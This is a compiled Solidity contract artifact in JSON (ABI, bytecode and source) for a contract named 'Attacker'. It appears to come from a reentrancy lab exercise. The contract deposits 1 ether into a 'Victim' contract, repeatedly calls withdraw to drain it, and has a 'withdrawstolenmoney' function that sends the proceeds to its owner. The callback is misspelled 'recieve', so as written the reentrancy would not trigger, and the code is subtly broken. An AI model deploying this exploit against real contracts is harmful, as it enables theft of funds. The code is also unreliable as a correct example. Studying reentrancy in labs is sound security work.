{
  "contractName": "Attacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "poorvictim",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "victim",
      "outputs": [
        {
          "internalType": "contract Victim",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "recieve",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdrawstolenmoney",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516106e93803806106e98339818101604052810190610032919061011c565b33600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610149565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100e9826100be565b9050919050565b6100f9816100de565b811461010457600080fd5b50565b600081519050610116816100f0565b92915050565b600060208284031215610132576101316100b9565b5b600061014084828501610107565b91505092915050565b610591806101586000396000f3fe60806040526004361061003f5760003560e01c8063930c200314610044578063979fd9f21461006f5780639e5faafc14610086578063a9e10bf214610090575b600080fd5b34801561005057600080fd5b5061005961009a565b6040516100669190610457565b60405180910390f35b34801561007b57600080fd5b506100846100be565b005b61008e6101b9565b005b61009861030e565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461014e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610145906104cf565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156101b6573d6000803e3d6000fd5b50565b670de0b6b3a76400003411610203576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101fa9061053b565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561027357600080fd5b505af1158015610287573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156102f457600080fd5b505af1158015610308573d6000803e3d6000fd5b50505050565b670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163111156103d65760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156103bd57600080fd5b505af11580156103d1573d6000803e3d6000fd5b505050505b565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061041d610418610413846103d8565b6103f8565b6103d8565b9050919050565b600061042f82610402565b9050919050565b600061044182610424565b9050919050565b61045181610436565b82525050565b600060208201905061046c6000830184610448565b92915050565b600082825260208201905092915050565b7f4e6f7420796f7572206d6f6e6579000000000000000000000000000000000000600082015250565b60006104b9600e83610472565b91506104c482610483565b602082019050919050565b600060208201905081810360008301526104e8816104ac565b9050919050565b7f53656e64206d6520736f6d652045544820746f20737461727400000000000000600082015250565b6000610525601983610472565b9150610530826104ef565b602082019050919050565b6000602082019050818103600083015261055481610518565b905091905056fea26469706673582212205ee57eeb3d4f4e96992c8aca76fbb3d0b1f0c6e3beedb5f2947877652d98a92764736f6c63430008130033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.19;\nimport \"./Victim.sol\";\ncontract Attacker {\n\n    Victim public victim;\n    address private owner;\n\n    constructor(address poorvictim){\n        owner = msg.sender;\n        victim = Victim(poorvictim);\n    }\n\n    function attack() public payable {\n        require(msg.value>1 ether,\"Send me some ETH to start\");\n        victim.deposit{value: 1 ether}();\n\n        victim.withdraw();\n\n    }\n\n    function recieve() public payable{\n        if(address(victim).balance>1 ether){\n            victim.withdraw();\n        }\n    }\n\n    function withdrawstolenmoney() public {\n        require(msg.sender == owner ,\"Not your money\");\n        payable(owner).transfer(address(this).balance);\n    }\n}",
  "sourcePath": "/home/aca/smartcontracts/reentrancy/contracts/Attacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.19+commit.7dd6d404.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-04-20T17:20:22.026Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}